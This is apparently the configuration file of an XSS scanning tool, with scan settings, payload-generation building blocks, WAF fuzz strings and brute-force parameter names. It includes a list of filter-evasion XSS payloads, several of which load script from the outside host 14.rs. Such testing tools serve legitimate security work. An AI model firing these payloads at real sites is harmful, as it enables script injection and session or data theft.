changes = '''Negligible DOM XSS false positives;x10 faster crawling'''
globalVariables = {}  # it holds variables during runtime for collaboration across modules

defaultEditor = 'nano'
blindPayload = ''  # your blind XSS payload
xsschecker = 'v3dm0s'  # A non malicious string to check for reflections and stuff

#  More information on adding proxies: http://docs.python-requests.org/en/master/user/advanced/#proxies
proxies = {'http': 'http://0.0.0.0:8080', 'https': 'http://0.0.0.0:8080'}

minEfficiency = 90  # payloads below this efficiency will not be displayed

delay = 0  # default delay between http requests
threadCount = 3  # default number of threads
timeout = 10  # default number of http request timeout

# JS rendering configuration
jsRender = False  # whether to use JavaScript rendering (requires Playwright)
jsRenderWait = 10  # maximum seconds to wait for page load (continues when page ready or timeout)
browserHeadless = True  # run browser in headless mode

# Stored XSS verification configuration
verifyUrl = None  # URL to verify stored XSS payloads
verifyMethod = 'GET'  # HTTP method for verification URL

# attributes that have special properties
specialAttributes = ['srcdoc', 'src']

badTags = ('iframe', 'title', 'textarea', 'noembed',
           'style', 'template', 'noscript')

# ==================== Payload 配置模式 ====================
# 提供两种模式：精简模式（~100个payload）和完整模式

# 精简模式配置（默认）- 约100个payload，专注于最有效的攻击向量
slim_config = {
    'tags': ('img', 'svg', 'body', 'script'),
    'jFillings': (';'),
    'lFillings': ('',),
    'eFillings': ('%09', ' '),
    'fillings': ('%09', ' '),
    'eventHandlers': {
        'onerror': ['img', 'body'],
        'onload': ['svg', 'body'],
        'direct': ['script']
    },
    'functions': (
        'alert(1)',
        'confirm()',
        'prompt()'
    )
}

# 完整模式配置 - 覆盖更多变体和绕过技巧
full_config = {
    'tags': ('html', 'd3v', 'a', 'details'),
    'jFillings': (';'),
    'lFillings': ('', '%0dx'),
    'eFillings': ('%09', '%0a', '%0d', '+'),
    'fillings': ('%09', '%0a', '%0d', '/+/'),
    'eventHandlers': {
        'ontoggle': ['details'],
        'onpointerenter': ['d3v', 'details', 'html', 'a'],
        'onmouseover': ['a', 'html', 'd3v']
    },
    'functions': (
        '[8].find(confirm)', 'confirm()',
        '(confirm)()', 'co\u006efir\u006d()',
        '(prompt)``', 'a=prompt,a()'
    )
}

# 默认使用精简模式
_useSlimPayloads = True

# 获取当前激活的payload配置
def getPayloadConfig():
    """获取当前激活的payload配置字典"""
    return slim_config if _useSlimPayloads else full_config

def applyPayloadConfig(use_slim=True):
    """
    应用payload配置，切换精简模式或完整模式
    
    Args:
        use_slim: True=精简模式（~100个payload），False=完整模式
    
    Returns:
        预计payload数量（实际数量可能略有不同，因为会根据上下文过滤）
    """
    global _useSlimPayloads
    _useSlimPayloads = use_slim
    
    config = getPayloadConfig()
    
    # 更精确的预计payload数量计算
    # 考虑到 eventHandler 与 tag 的映射关系
    total = 0
    for tag in config['tags']:
        for eventHandler in config['eventHandlers']:
            if tag in config['eventHandlers'][eventHandler]:
                # script 标签的 direct 事件：虽然用了 continue，但仍会遍历所有 filling/eFilling/lFilling 组合
                if tag == 'script' and eventHandler == 'direct':
                    # <script>function</script> 格式
                    # 实际生成：functions × fillings × eFillings × lFillings × ends
                    # (continue 只跳过当前 end，但会遍历所有外层循环组合)
                    total += len(config['functions']) * len(config['fillings']) * \
                            len(config['eFillings']) * len(config['lFillings']) * 2
                else:
                    # 其他标签：functions × fillings × eFillings × lFillings × ends
                    total += len(config['functions']) * len(config['fillings']) * \
                            len(config['eFillings']) * len(config['lFillings']) * 2
    
    return total

# 导出的配置变量（向后兼容，初始值）
# 注意：这些会在 applyPayloadConfig 调用后被更新
tags = slim_config['tags']
jFillings = slim_config['jFillings']
lFillings = slim_config['lFillings']
eFillings = slim_config['eFillings']
fillings = slim_config['fillings']
eventHandlers = slim_config['eventHandlers']
functions = slim_config['functions']

payloads = (  # Payloads for filter & WAF evasion
    '\'"</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>')

fuzzes = (  # Fuzz strings to test WAFs
    '<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
    '<test/oNxX=yYy//', '<test oNxX=yYy>', '<test onload=x', '<test/o%00nload=x',
    '<test sRc=xxx', '<test data=asa', '<test data=javascript:asa', '<svg x=y>',
    '<details x=y//', '<a href=x//', '<emBed x=y>', '<object x=y//', '<bGsOund sRc=x>',
    '<iSinDEx x=y//', '<aUdio x=y>', '<script x=y>', '<script//src=//', '">payload<br/attr="',
    '"-confirm``-"', '<test ONdBlcLicK=x>', '<test/oNcoNTeXtMenU=x>', '<test OndRAgOvEr=x>')

headers = {  # default headers
    'User-Agent': '$',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
}

blindParams = [  # common paramtere names to be bruteforced for parameter discovery
    'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
    'frame', 'config', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text', 'load', 'email',
    'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href', 'ref', 'data', 'input',
    'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword', 'key', 'q', 'query', 'aid',
    'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid',
    'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head', 'higher', 'lower', 'width',
    'height', 'add', 'result', 'log', 'demo', 'example', 'message']
